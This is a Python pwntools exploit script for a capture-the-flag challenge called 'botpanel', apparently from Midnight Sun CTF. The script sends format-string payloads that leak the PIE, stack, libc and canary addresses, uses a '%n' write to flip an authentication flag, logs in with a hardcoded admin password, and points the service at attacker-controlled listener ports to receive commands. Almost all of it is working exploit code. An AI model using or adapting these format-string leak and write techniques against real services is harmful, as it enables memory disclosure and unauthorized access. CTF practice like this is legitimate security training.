#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "pwn.midnightsunctf.se"
PORT = 31337

def sendinvite(ip, port):
	r.sendline("2")
	r.sendlineafter("IP:", ip)
	r.sendlineafter("Port:", str(port))
	r.recvuntil("> ")

def exploit(r):
	log.info("Leak stack / pie / libc")

	r.sendafter("password: ", "%3$p%5$p%8$p")
	r.recvuntil("was: ")
	LEAK = r.recvline().strip()
	PIE = int(LEAK[0:10], 16)
	STACK = int(LEAK[10:20], 16)
	LIBC = int(LEAK[20:30], 16)

	log.info("PIE leak         : %s" % hex(PIE))
	log.info("STACK leak       : %s" % hex(STACK))
	log.info("LIBC leak        : %s" % hex(LIBC))

	log.info("Leak canary")

	r.sendlineafter("password: ", "%15$p")
	r.recvuntil("was: ")
	CANARY = int(r.recvline().strip(), 16)

	log.info("CANARY           : %s" % hex(CANARY))

	log.info("Set registered mode")
	r.recvuntil("password: ")
	r.sendline("%5$n")

	if LOCAL:
		PW = "notrealpw!!"
	else:
		PW = ">@!ADMIN!@<"

	log.info("Do real login")
	r.recvuntil("password: ")
	r.sendline(PW)

	r.recvuntil("> ")

	with open("data", "w") as f:
		f.write("%s\n" % hex(PIE))
		f.write("%s\n" % hex(LIBC))
		f.write("%s\n" % hex(STACK))
		f.write("%s\n" % hex(CANARY))

	MYIP = "XXX.XXX.XXX.XXX"
	MYPORT = 7777

	sendinvite(MYIP, 6666)
	sendinvite(MYIP, 7777)

	log.info("Wait for invite servers to send command...")

	r.interactive()
	
	return

if __name__ == "__main__":
	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process(["./botpanel_e0117db42051bbbe6a9c5db571c45588", "1000"], env={"LD_PRELOAD" : "./libc.so"})
		print util.proc.pidof(r)
		pause()
		exploit(r)
